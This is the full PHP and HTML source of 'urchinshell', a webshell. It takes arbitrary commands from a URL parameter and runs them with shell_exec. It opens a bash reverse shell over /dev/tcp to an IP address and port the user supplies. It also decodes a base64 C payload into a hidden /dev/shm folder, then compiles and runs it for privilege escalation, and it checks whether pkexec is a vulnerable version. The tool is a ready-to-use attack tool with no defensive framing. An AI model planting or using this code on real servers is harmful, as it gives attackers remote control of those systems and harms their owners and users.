<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>urchinshell [webshell v1]</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <style>
        @import url("https://fonts.googleapis.com/css?family=Inconsolata:400,400i,700");

        body {
            background: rgb(49, 49, 49);
        }

        .form {
            font-family: "Inconsolata", sans-serif;
            max-width: 400px;
            margin: 10px auto;
            padding: 16px;
            background-color: rgb(55, 55, 55);
        }

        .form p,pre {
            color: white;
            text-align: center;
        }

        .form p.alert {
            color: red;
            padding: 14px 16px;
        }

        .form h1{
            padding: 20px 0;
            font-size: 140%;
            font-weight: 300;
            text-align: center;
            color: #fff;
            margin: -16px -16px 16px -16px;
        }

        .form input[type="text"],
        .form input[type="submit"]{
            -webkit-transition: all 0.30s ease-in-out;
            -moz-transition: all 0.30s ease-in-out;
            -ms-transition: all 0.30s ease-in-out;
            -o-transition: all 0.30s ease-in-out;
            outline: none;
            box-sizing: border-box;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            width: 100%;
            background: #fff;
            margin-bottom: 4%;
            border: 1px solid #ccc;
            padding: 3%;
            color: white;
            font-family: 'Inconsolata', sans-serif;
        }

        .form input[type="submit"]:focus,
        .form input[type="text"]:focus {
            padding: 3%;
        }

        .form input[type="submit"], .form input[type="file"] {
            background: rgb(33, 33, 33);
            border: none;
            color: limegreen;
        }
        
        .form input[type="text"] {
            background-color: rgb(46, 46, 46);
            color: limegreen;
            border: none;
        }

        .form input[type="submit"]:hover {
            background: rgb(36, 36, 36);
            transition: 3ms;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="form">
        <h1 align="center">urchinshell</h1>
        <form action="" method="get">
            <p align="center">Automation</p>
            <pre align="center">poppy | reverse-shell</pre>
            <input type="text" name="base64pay" placeholder="I2......"/>
            <input type="submit" value="automate-privesc"/>
        </form>
        <form action="" method="get">
            <p align="center">Bind Reverse Shell</p>
            <input type="text" name="ipaddr" placeholder="127.0.0.1"/>
            <input type="text" name="port" placeholder="1234"/>
            <input type="submit" value="revshell" name="revshell" />
        </form>
        <form action="" method="get">
            <p align="center">Shell Exec</p>
            <input type="text" name="command" placeholder="whoami" />
            <input type="submit" name="exec" value="execute" />
        </form> 
        <div class="output">
            <?php
                $command = $_GET["command"];
                $ip_addr = $_GET["ipaddr"];
                $port = $_GET["port"];
                $b64en = $_GET["base64pay"];
                if (isset($command)) {
                    // filters shell commands
                    $string = $command;
                    if ($string === "poppy") {
                        echo "<p class='alert' align='center'>UnderDevelopment</p>";
                    } elseif ($string === "polversion") {
                        $check_version = shell_exec("pkexec --version");
                        echo "<p class='alert' align='center'>Version : " . $check_version . ", If Version is less than < 0.130 == Vulnerable</p>";
                    }
                    elseif ($string === "help") {
                        $help_info = "help = This output<br> polversion = Show version of pkexec<br> poppy = Exploit poppy and get backdoor access";
                        echo "<p class='alert' align='center'>" . $help_info . "</p>";
                    }
                    else {
                        $output = shell_exec($string);
                        echo "<p class='alert' align='center'>" . $output . "</p>";
                    }
                }
                elseif (isset($ip_addr) && isset($port)) {
                    echo "<p class='alert' align='center'>Executed Reverse Shell</p>";
                    $bind_rev_shell = 'bash -c "bash -i &>/dev/tcp/'. $ip_addr . '/' . $port . '<&1"';
                    $exec = shell_exec($bind_rev_shell);
                }
                elseif (isset($b64en)) {
                    $string = $b64en;
                    $all = "mkdir /dev/shm/.test/; cd /dev/shm/.test/; echo " . $string . "| base64 -d > out.c && gcc -o out out.c && ./out";
                    shell_exec($all);
                }
                else {
                    echo "<p align='center'>Output Here</p>";
                }
            ?>
        </div>
    </div>
</body>
</html>
